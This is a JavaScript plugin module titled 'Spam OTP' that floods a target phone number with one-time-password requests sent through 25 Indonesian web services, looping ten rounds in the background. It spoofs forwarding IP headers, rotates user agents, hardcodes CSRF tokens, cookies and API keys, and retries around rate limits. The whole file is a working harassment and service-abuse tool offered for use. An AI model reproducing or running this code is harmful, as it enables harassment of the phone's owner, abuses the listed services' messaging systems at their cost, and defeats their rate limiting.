import { randomUUID, randomInt } from "crypto";

const CONFIG = {
  concurrent: 1,
  retries: 2,
  timeout: 45000,
  delayMin: 3000,
  delayMax: 5000
};

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Safari/604.1',
  'Mozilla/5.0 (Linux; Android 14; SM-S921B) Chrome/120.0.0.0 Mobile Safari/537.36'
];

const IP_POOL = Array.from({ length: 1000 }, () =>
  `${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 255)}`
);

function randomIP() { return IP_POOL[randomInt(0, IP_POOL.length - 1)]; }
function randomUA() { return USER_AGENTS[randomInt(0, USER_AGENTS.length - 1)]; }
function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
function rand(min, max) { return randomInt(min, max + 1); }
function generateEmail() {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let r = '';
  for (let i = 0; i < 10; i++) r += chars.charAt(randomInt(0, chars.length - 1));
  return `${r}@bwmyga.com`;
}

function normalizePhone(phone) {
  let p = phone.replace(/[^0-9]/g, "");
  if (p.startsWith("0")) p = "62" + p.slice(1);
  if (!p.startsWith("62")) p = "62" + p;
  return p;
}

let pinhomeCsrfCache = null;
let pinhomeCsrfExpiry = 0;

async function getPinhomeCSRF() {
  const now = Date.now();
  if (pinhomeCsrfCache && (now - pinhomeCsrfExpiry) < 300000) {
    return pinhomeCsrfCache;
  }

  try {
    const ac = new AbortController();
    const timer = setTimeout(() => ac.abort(), 10000);
    const resp = await fetch('https://www.pinhome.id/daftar', {
      headers: {
        'User-Agent': randomUA(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
      },
      signal: ac.signal
    });
    clearTimeout(timer);

    let csrfToken = '';
    let cookieString = '';
    const cookies = resp.headers.getSetCookie ? resp.headers.getSetCookie() : (resp.headers.get('set-cookie') ? [resp.headers.get('set-cookie')] : []);

    cookies.forEach(c => {
      const parts = c.split(';');
      const nameValue = parts[0];
      cookieString += nameValue + '; ';
      if (nameValue.includes('_X7kCsrf')) {
        csrfToken = nameValue.split('=')[1];
      }
    });

    const html = await resp.text();
    if (!csrfToken) {
      const match = html.match(/"csrfToken":"([^"]+)"/) || html.match(/name="csrf-token" content="([^"]+)"/);
      if (match) csrfToken = match[1];
    }

    if (!csrfToken) {
      csrfToken = 'v4.local.5DA4oydS9lBboyNDmZ8KRpqTmC1KjU1TNS7sFGkUbxA7bewqbsFXq2M7Fgfa9QZvzE3rMwFS1iWEAnr1maz0_UqbdUxJTQ7ZI-SDX4JyRv2crVkidEZf9PXheBwQDzF_5mAhHty7W45QcxHnsZmxH0WeYt7ex-YJFAeFS5aOspraWFxaMLh7ZgPU4OarH6kZs7zAW1-1NfBH3al3SATpixJ9hUj-jA5yJgcsOdDSSsOGXk8';
      cookieString = '_X7kCsrf=' + csrfToken + '; _ga=GA1.1.1752313616.1783394371; _fbp=fb.1.1783394372483.552359809276689952; _clck=dub9tf%5E2%5Eg7j%5E0%5E2379';
    }

    pinhomeCsrfCache = { csrfToken, cookieString };
    pinhomeCsrfExpiry = now;
    return pinhomeCsrfCache;
  } catch (e) {
    return {
      csrfToken: 'v4.local.5DA4oydS9lBboyNDmZ8KRpqTmC1KjU1TNS7sFGkUbxA7bewqbsFXq2M7Fgfa9QZvzE3rMwFS1iWEAnr1maz0_UqbdUxJTQ7ZI-SDX4JyRv2crVkidEZf9PXheBwQDzF_5mAhHty7W45QcxHnsZmxH0WeYt7ex-YJFAeFS5aOspraWFxaMLh7ZgPU4OarH6kZs7zAW1-1NfBH3al3SATpixJ9hUj-jA5yJgcsOdDSSsOGXk8',
      cookieString: '_X7kCsrf=v4.local.5DA4oydS9lBboyNDmZ8KRpqTmC1KjU1TNS7sFGkUbxA7bewqbsFXq2M7Fgfa9QZvzE3rMwFS1iWEAnr1maz0_UqbdUxJTQ7ZI-SDX4JyRv2crVkidEZf9PXheBwQDzF_5mAhHty7W45QcxHnsZmxH0WeYt7ex-YJFAeFS5aOspraWFxaMLh7ZgPU4OarH6kZs7zAW1-1NfBH3al3SATpixJ9hUj-jA5yJgcsOdDSSsOGXk8; _ga=GA1.1.1752313616.1783394371'
    };
  }
}

async function getEndpoints(phone) {
  const p08 = "0" + phone.slice(2);
  const p62 = phone;
  const pNoCountry = phone.replace("62", "");
  const deviceId = randomUUID();
  const requestId = randomUUID();

  return [
    { url: "https://api.maulagi.id/api/v2/auth/check", data: { credentials: p62 }, headers: { "X-ML-KEY": "B10JLPEP10" } },
    { url: "https://matahari-backend-prod.matahari.com/api/auth/re-activation", data: { mobileCountryCode: "", mobileNumber: p08, activationCode: "" } },
    { url: "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp", data: { accountType: "customers", applicationType: "Pinhome Web", countryCode: "62", medium: "whatsapp", otpType: "register", phoneNumber: pNoCountry } },
    { url: "https://internetrakyat.id/api/app/auth/send-otp-register", data: { phone_number: p08 }, headers: { "x-api-key": "280999!FTTH" } },
    { url: "https://www.bonusbelanja.com/api/auth/registration/app", data: { phone: p62, name: "User", agreeTnc: true, agreeContact: false } },
    { url: "https://www.alodokter.com/resend-otp", data: { user: { phone: p08, uuid: randomUUID() }, request_via: "whatsapp" } },
    { url: "https://www.beautyhaul.com/ajax/account/send_otp", data: { method: "WhatsApp", phone: p62 } },
    { url: "https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id", data: { nama_lengkap: "User", telepon: p08, email: `user${rand(1000,9999)}@mail.com` }, headers: { "Xid": String(rand(1000000, 9999999)), "source": "ocistok" } },
    { url: "https://api.duniagames.co.id/api/other/api/v1/content/", data: null, method: "GET", headers: { "Accept-Language": "id", "x-device": deviceId, "Ciam-Type": "FR" } },
    {
      url: "https://api.dokterin.id/user/v1/users/login",
      data: { phone: p62, tnc_accept: true, device_id: randomUUID() },
      headers: { "Origin": "https://dokterin.id", "Referer": "https://dokterin.id/login" }
    },
    { url: "https://api.paper.id/api/v1/auth/login", data: { method: "whatsapp", phone: p08 }, headers: { "Origin": "https://www.paper.id", "Referer": "https://www.paper.id/", "x-paper-user-agent": "Jupiter/7.19.5 desktop (windows) Firefox 152", "request-id": requestId } },
    {
      url: "https://cms.bunda.co.id/api/v1/auth/send-otp",
      data: { phone_number: p62, type: "auth" },
      headers: { "Origin": "https://www.bunda.co.id", "Referer": "https://www.bunda.co.id/id", "X-Requested-With": "XMLHttpRequest", "X-Locale": "id" }
    },
    { url: "https://api.fastwork.id/auth/v2/signup.sendVerificationCode", data: { phone_number: p08 } },
    { url: "https://api.indodax.com/api/v1/otp/send", data: { email: generateEmail(), flow: "register", method: "whatsapp", old_uuid: "" }, headers: { "Origin": "https://indodax.com", "Referer": "https://indodax.com/", "key": "bAGUG2WiLy", "authorization": "Bearer bAGUG2WiLy" } },
    { url: "https://saturdays.com/api/v1/auth/otp", data: { phone: p62, type: "register" } },
    { url: "https://api.saturdays.com/v2/user/otp/request", data: { phoneNumber: p62, channel: "whatsapp" } },
    { url: "https://api.planetban.com/website/customer/request-otp", data: { name: "Test", phone: p08, password: "Test123", purpose: "register", method: "whatsapp" }, headers: { "Origin": "https://planetban.com" } },
    { url: "https://www.rumah123.com/api/otp/request-otp", data: { cancelledRequestId: String(rand(100000, 999999)), ipAddress: randomIP(), phoneNumber: p08, portalId: 1, type: "WHATSAPP", url: "https://www.rumah123.com/user/login?redirect=%2Fcustomer%2Fv3%2Fpasang-iklan%2F" }, headers: { "Origin": "https://www.rumah123.com", "base-url-core": "https://www.rumah123.com" } },
    { url: "https://register.paper.id/api/v1/auth/register/send-otp", data: { phone: p08, method: "whatsapp", registered_by: "flutter mweb" }, headers: { "Origin": "https://paper.id", "x-paper-user-agent": "multiverse/2.54.1 mobile_web (android) chrome" } },
    { url: "https://www.hijup.com/sign_in", data: JSON.stringify([{ phone_number: p08, store_path: "hijup" }]), headers: { "Content-Type": "text/plain;charset=UTF-8", "Origin": "https://www.hijup.com", "next-action": "b7eda6e749fbadcfcf226c2e36865091520b679f", "next-url": "/sign_in" } },
    { url: "https://ohsome.co.id/api/member/user/random_code_check", data: { country_code: "62", account: pNoCountry, type_id: 2, device_id: randomUUID().replace(/-/g, ""), check_code: "219097", image_id: "tcsRCTZ0RAvqQAvcUJDG" }, headers: { "Origin": "https://ohsome.co.id", "language": "id", "x-store-no": "SC001", "platform": "H5" } },
    { url: "https://api.optikmelawai.com/api/v3/auth/register/1", data: { phone: p08, method: "whatsapp" }, headers: { "Origin": "https://www.optikmelawai.com", "language": "id" } },
    { url: "https://www.hollandbakery.co.id/resend-otp-register", data: { phone: p08 }, headers: { "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.hollandbakery.co.id", "Referer": "https://www.hollandbakery.co.id/users/verify_token" } },
    { url: "https://website-api.hashmicro.com/api/add/3", data: { phone: p08, type: "whatsapp" }, headers: { "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.hashmicro.com" } },
    { url: "https://sso.rcx.co.id/auth/passwordless/request", data: { phone: p08, medium: "whatsapp" }, headers: { "Origin": "https://rcx.co.id" } }
  ];
}

async function sendRequest(ep, idx) {
  const headers = {
    "Content-Type": "application/json",
    "User-Agent": randomUA(),
    "X-Forwarded-For": randomIP(),
    "X-Real-IP": randomIP(),
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8",
    "Connection": "keep-alive",
    ...(ep.headers || {})
  };

  const hostname = new URL(ep.url).hostname;
  const isGet = ep.method === "GET";
  if (!isGet) await delay(rand(CONFIG.delayMin, CONFIG.delayMax));

  for (let attempt = 0; attempt <= CONFIG.retries; attempt++) {
    try {
      const ac = new AbortController();
      const timer = setTimeout(() => ac.abort(), CONFIG.timeout);
      const fetchOpts = { method: isGet ? "GET" : (ep.method || "POST"), headers, signal: ac.signal };
      if (!isGet) {
        if (typeof ep.data === "string") {
          fetchOpts.body = ep.data;
        } else if (headers["Content-Type"] && headers["Content-Type"].includes("application/x-www-form-urlencoded")) {
          fetchOpts.body = new URLSearchParams(ep.data || {}).toString();
        } else if (ep.data !== null && ep.data !== undefined) {
          fetchOpts.body = JSON.stringify(ep.data);
        }
      }
      const res = await fetch(ep.url, fetchOpts);
      clearTimeout(timer);

      if (res.ok) return { idx, hostname, status: "sent" };

      let body = {};
      try { body = await res.clone().json(); } catch {}

      if (body.success === true || body.status === "success" || body.statusCode === 200 ||
          body.message === "OTP terkirim" || body.message === "OTP sent successfully" ||
          body.message === "Success." ||
          (body.data && (body.data.otp === "processed" || body.data.new_uuid || body.data.status === 1)) ||
          body.secretCode) {
        return { idx, hostname, status: "sent" };
      }

      if (res.status === 429) {
        if (attempt < CONFIG.retries) await delay(30000, 45000);
        continue;
      }
    } catch {
      if (attempt < CONFIG.retries) await delay(rand(5000, 8000));
    }
  }
  return { idx, hostname, status: "failed" };
}

const taskCache = new Map();
const TASK_TTL = 15 * 60 * 1000;
const TOTAL_ROUNDS = 10;

async function runBackgroundTask(phone) {
  const entry = {
    done: false,
    totalRounds: TOTAL_ROUNDS,
    currentRound: 1,
    total: 0,
    sent: 0,
    failed: 0,
    elapsed: null,
    results: []
  };
  taskCache.set(phone, entry);

  try {
    const endpoints = await getEndpoints(phone);
    entry.total = endpoints.length * TOTAL_ROUNDS;
    const start = Date.now();

    for (let round = 1; round <= TOTAL_ROUNDS; round++) {
      entry.currentRound = round;
      for (let i = 0; i < endpoints.length; i++) {
        const reqIdx = (round - 1) * endpoints.length + i + 1;
        const r = await sendRequest(endpoints[i], reqIdx);
        entry.results.push({ round, ...r });
        if (r.status === "sent") entry.sent++;
        else entry.failed++;
      }
      if (round < TOTAL_ROUNDS) await delay(rand(3000, 6000));
    }

    entry.elapsed = ((Date.now() - start) / 1000).toFixed(1);
    entry.done = true;
  } catch (err) {
    entry.done = true;
    entry.error = err.message;
  }

  setTimeout(() => taskCache.delete(phone), TASK_TTL);
}

export default {
  name: "Spam OTP",
  description: "Kirim OTP spam ke 25 layanan Indonesia (Otomatis 10x putaran/ronde per request - Maulagi, Matahari, Pinhome, Internet Rakyat + 21 lainnya)",
  category: "Tools",
  methods: ["GET", "POST"],
  params: ["number"],
  paramsSchema: {
    number: { type: "string", required: true, description: "Nomor telepon target", example: "6281234567890" }
  },

  async run(req, res) {
    try {
      let { number, phone, status } = { ...req.query, ...req.body };
      let targetPhone = number || phone;

      if (!targetPhone || !String(targetPhone).trim()) {
        return res.status(400).json({ status: false, message: "Parameter 'number' wajib diisi" });
      }

      targetPhone = normalizePhone(String(targetPhone).trim());

      // Status check mode
      if (status === "true" || status === "1") {
        const cached = taskCache.get(targetPhone);
        if (!cached) {
          return res.json({ status: true, number: targetPhone, message: "Task belum dimulai atau sudah expired (TTL 15 menit)" });
        }
        return res.json({
          status: true,
          number: targetPhone,
          taskStatus: cached.done ? "completed" : "running",
          currentRound: cached.currentRound || 1,
          totalRounds: cached.totalRounds || 10,
          total: cached.total,
          sent: cached.sent,
          failed: cached.failed,
          elapsed: cached.elapsed ? `${cached.elapsed}s` : null,
          results: cached.results || []
        });
      }

      // Start background task
      runBackgroundTask(targetPhone);

      return res.json({
        status: true,
        number: targetPhone,
        message: "Spam OTP 10x batch started in background. Check status using ?number=x&status=true",
        totalRounds: TOTAL_ROUNDS
      });

    } catch (err) {
      return res.status(500).json({ status: false, message: err.message || "Gagal spam OTP" });
    }
  }
};
